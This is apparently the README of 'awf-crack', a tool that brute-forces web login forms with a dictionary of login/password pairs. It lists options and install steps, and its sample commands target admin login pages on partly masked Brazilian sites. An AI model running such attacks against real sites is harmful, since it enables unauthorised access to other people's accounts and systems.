# awf-crack
Auth Web Form Crack

```
Usage: awf-crack [options ...]
	-a [string]   signature of user-agent
	-d [file]     dictionary of keywords
	-u [string]   user field on tag name
	-k [string]   password field on tag name
	-h [string]   hidden field on tag name. Use \"
	-s [url]      URL from action form
	-e [string]   some string indicate error
	-n            don't process headers
	-v            verbose mode
	-c            enable cookies
	-g            force use GET

```

Example: ./awf-crack -d file_dic -u user_field -k key_field [-h hidden_fd=\"value\" ...] -s addr_action -e msgerror [-v]

## How to install in Linux

Execute the file install.sh

```
chmod +x install.sh
./install.sh
```

## How to install in Windows

Download CodeBlocks and compile the source code.

## How to

Samples of how to use:

```
awf-crack -d dic_sql.txt -u email -k senha -s http://www.xxxxx.16mb.com/login.php -e "Usuario nao encontrado" -n

awf-crack -d dic_sql.txt -u login -k senha -s http://www.yyyyyyy.com.br/admin/logar.php -e "senha invalido" -n

awf-crack -d dic_sql.txt -u login -k senha -s http://wwwwwww.com.br/newsletter/ -e "erro.php"

awf-crack -d dic_sql.txt -u login -k senha -h logar=\"1\" -s http://www.zzzzzz.com.br/admin/_login.php -e "senha invalido" -n

awf-crack -d dic_sql.txt -u login -k senha -s http://www.site.com.br/admin/verifica.php -e "ou senha inv"

./awf-crack -d dic_sql.txt -u usuario -k senha -s http://www.website.com.br/admin/valida.php -e "o registrada" -n

./awf-crack -d dic_sql.txt -u usuario -k senha -s http://www.domainhere.com.br/site/admin/login/lib/valida.php -e "o conferem" -n
```

## Dictionary file

Use need use one line for login and other for password. Don't use spaces or new lines. you can use hashtag for coments. Sample:

```
login1
senha1
login2
pass2
# This is a coment
login3
keyword3
```
